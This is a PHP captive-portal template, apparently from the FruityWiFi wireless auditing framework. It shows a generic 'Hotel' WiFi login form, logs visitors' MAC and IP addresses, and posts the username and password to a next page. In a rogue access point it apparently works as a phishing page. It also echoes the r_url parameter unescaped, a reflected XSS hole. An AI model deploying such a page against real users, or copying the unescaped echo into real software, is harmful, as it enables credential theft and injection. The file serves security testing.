<?php
header("Expires: Mon, 1 Jan 1900 00:00:00 GMT");
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
	
include "/usr/share/fruitywifi/www/config/config.php";
include "/usr/share/fruitywifi/www/modules/captive/_info_.php";
include "/usr/share/fruitywifi/www/functions.php";
include "../_portal_functions.php";

if (isset($_GET["r_url"])) {
	$r_url = $_GET["r_url"];
} else {
	$r_url = $_SERVER["HTTP_HOST"];
}

// ------ GET MAC|IP ------ 
$ip = $_SERVER['REMOTE_ADDR'];
$mac = getMAC($ip);

// ------ LOGS ------
$current_script = basename(__FILE__);
storeEvent($mac, $ip, $current_script, $r_url);

// ------ NEXT PAGE ------
//if ($mod_captive_policy == "1") {
//	$next_page = "http://$io_in_ip/captive/$mod_captive_template/policy.php";
//} else {
	$next_page = "http://$io_in_ip/captive/$mod_captive_template/welcome.php";
//}

setRedirect();

?>
<!DOCTYPE html>
<html>
<head>
<title>Hotel</title>
<meta name="viewport" content="target-densitydpi=device-dpi">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
</head>
<body>
<link rel="stylesheet" type="text/css" href="fonts.css"/>
<style>
body {
	margin: 0px;
	color: #999999;
}
 .box {
   border: 1px solid black;
   width:300px; 
   height:380px;
   padding:2px;
   font-family: "Lucida Sans Unicode", Verdana, Arial;
   font-size: 12px;
   background: white;
}
.box-form-top {
	background: #CFC4B4;
	width: 250px;
	height: 5px;
}
.box-form {
	background: #b30000;
	width: 250px;
	padding: 10px;
	color: white;
	font-family: "Lucida Sans Unicode", Verdana, Arial;
   	font-size: 12px;
}

</style>

<div style="width:100%; height: 100%; background: #000000; z-index: -200; position: absolute;"></div>
<div style="width:100%; height: 200px; background: #b30000; z-index: -100; position: absolute;"></div>

<br>

<div align="center" style="width:100%; z-index: 100;">
<table class="box">
	<tr>
		<td valign="top" align="center" height="20px">
			<h2>Welcome to <?php echo $portal_name;?></h2>
		</td>
	</tr>
	<tr>
		<td valign="top" style="padding-left: 20px">
			<br><br>
			<div style="padding: 2px;">Registered User | WiFi</div>
			<div class="box-form-top"></div>
				<form style="margin: 0px" name="form" action="<?=$next_page?>?r_url=<?=$r_url?>" method='POST' autocomplete="off">
					<table class="box-form">
						<tr>
							<td>Username </td>
							<td><input name="user" style="width:100%"></td>
						</tr>
						<tr>
							<td>Password </td>
							<td><input name="pass" type="password" style="width:100%"></td>
						</tr>
						<tr>
							<td></td>
							<td><input type="submit" value="Login"></td>
						</tr>
					</table>
				</form>
		</td>
	</tr>
	<tr>
		<td valign="top" align="right" height="20px">
			<img src='wifi-002.png' width="50px">
		</td>
	</tr>
</table>
</div>
</body
</html>